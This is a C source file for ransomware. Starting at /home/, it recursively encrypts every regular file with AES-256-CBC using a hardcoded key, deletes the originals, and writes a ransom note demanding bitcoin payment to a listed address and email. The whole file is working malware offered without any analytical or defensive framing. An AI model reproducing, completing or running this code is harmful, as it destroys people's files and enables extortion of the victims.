#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <openssl/evp.h>
#include <openssl/aes.h>


void ls_dir(char* intial_path);
void encryptfile(FILE * fpin,FILE* fpout,unsigned char* key, unsigned char* iv);


int main()
{
   	
	char* intial_path;
	intial_path = "/home/";
    ls_dir(intial_path);

    return 0;
}

void ls_dir(char* intial_path)
{
	
	unsigned char key[] = "98765432101234567890123456123456";// 32 char 256bit key
    unsigned char iv[] = "1234567890123456";//same size as block 16 char 128 bit block

	DIR* dir;
	struct dirent *ent;
	if((dir=opendir(intial_path)) !=NULL)
	{
		while((ent=readdir(dir)) !=NULL)
		{
			int len = strlen(ent->d_name);
			const char* last_four = &ent->d_name[len-4];
			if(strcmp(last_four,".enc") != 0)
			{
				if(ent->d_type == 8)
				{
					char* full_path_readme =(char*) malloc(strlen("RANSOMEWARE_INFO")+strlen(intial_path)+2);
					strcpy(full_path_readme,intial_path);
					strcat(full_path_readme,"RANSOMEWARE_INFO");
					char* full_path =(char*) malloc(strlen(ent->d_name)+strlen(intial_path)+2);
					strcpy(full_path,intial_path);
					strcat(full_path,ent->d_name);
					char* new_name = (char*) malloc(strlen(full_path)+strlen(".enc")+1);
					strcpy(new_name,full_path);
					strcat(new_name,".enc");
					if(strcmp(full_path,"/etc/passwd") !=0 && strcmp(full_path,"/etc/shadow")!=0 && strcmp(full_path,"/etc/sudoers") !=0)
					{
						FILE* fpin;
						FILE* fpout;
						FILE* fpreadme;
					
						
						fpin=fopen(full_path,"rb");
						fpout=fopen(new_name,"wb");
						fpreadme=fopen(full_path_readme,"w");
						
						fprintf(fpreadme,"You have been PWNED! \n\n Hear me ROAR All files belong to me and are in an encrypted state. I have but two simple commands.\n\n 1. Tranfer money to my bitcoin address \n 2. Email me with your bitcoin address that you used to send the money. Then I will email with an antidote \n\n Pay me Now! \n My Bitcoin Address:Xg7665tgf677hhjhjhhh\n Email:xxxyy@yandex.ru \n");
						fclose(fpreadme);
						
						encryptfile(fpin,fpout,key,iv);

						fclose(fpin);
						fclose(fpout);
						remove(full_path);
					}
					free(full_path);
					free(new_name);
				}
				else if(ent->d_type==4)
				{

					char *full_path=(char*) malloc(strlen(intial_path)+strlen(ent->d_name)+2);
					strcpy(full_path,intial_path);
					strcat(full_path,ent->d_name);
					strcat(full_path,"/");
					printf("%s\n",full_path);
					if(full_path != intial_path && ent->d_name[0] != '.')
					{
						ls_dir(full_path);
					}
					
					free(full_path);


				}

			}
		}
	}

}
void encryptfile(FILE * fpin,FILE* fpout,unsigned char* key, unsigned char* iv)
{
	//Using openssl EVP to encrypt a file

	
	const unsigned bufsize = 4096;
	unsigned char* read_buf = malloc(bufsize);
	unsigned char* cipher_buf ;
	unsigned blocksize;
	int out_len;

	EVP_CIPHER_CTX ctx;

	EVP_CipherInit(&ctx,EVP_aes_256_cbc(),key,iv,1);
	blocksize = EVP_CIPHER_CTX_block_size(&ctx);
	cipher_buf = malloc(bufsize+blocksize);

	// read file and write encrypted file until eof
	while(1)
	{
		int bytes_read = fread(read_buf,sizeof(unsigned char),bufsize,fpin);
		EVP_CipherUpdate(&ctx,cipher_buf,&out_len,read_buf, bytes_read);
		fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);
		if(bytes_read < bufsize)
		{
			break;//EOF
		}
	}

	EVP_CipherFinal(&ctx,cipher_buf,&out_len);
	fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);

	free(cipher_buf);
	free(read_buf);
}